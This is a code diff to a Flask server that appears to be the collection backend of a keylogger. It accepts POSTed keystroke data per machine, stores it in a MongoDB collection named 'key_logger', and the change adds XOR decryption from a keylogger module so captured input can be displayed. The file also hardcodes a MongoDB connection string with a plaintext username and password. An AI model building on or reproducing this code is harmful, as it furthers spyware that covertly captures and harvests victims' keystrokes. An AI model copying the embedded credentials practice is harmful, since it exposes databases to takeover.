@@ -3,7 +3,12 @@ from flask_cors import CORS
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 from bson.json_util import dumps
+import sys
 import json
+import os
+
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
+from keylogger.keylogger import Encryptor
 
 app = Flask(__name__, template_folder="static")
 CORS(app)
@@ -13,6 +18,7 @@ MONGO_URI = "mongodb+srv://ishaicohen125:Aa12345@cluster0.z4ssc0b.mongodb.net/?r
 client = MongoClient(MONGO_URI, server_api=ServerApi("1"))
 db = client["key_logger"]
 db_collection = db["KeyLogger"]
+encryptor = Encryptor()
 
 @app.route("/")
 def home():
@@ -23,7 +29,7 @@ def home():
 def get_computers():
 
     if request.method == "POST":
-        new_data = request.get_json() # {"machine_name": machine_name, "data": data}
+        new_data = request.get_json()
 
         if not new_data or "machine_name" not in new_data or "data" not in new_data:
             return jsonify({"error": "Invalid data format"}), 400
@@ -63,7 +69,7 @@ def get_computer(computer):
         computer_data = db_collection.find_one({"machine_name": computer}, {'_id': 0})
         if not computer_data:
             return jsonify({"error": "Computer not found!"}), 404
-        return render_template("monitor.html", computer_data=computer_data)
+        return render_template("monitor.html", computer_data=encryptor.xor(computer_data["data"]))
     except Exception as e:
         return jsonify({"Error": str(e)}), 500
 
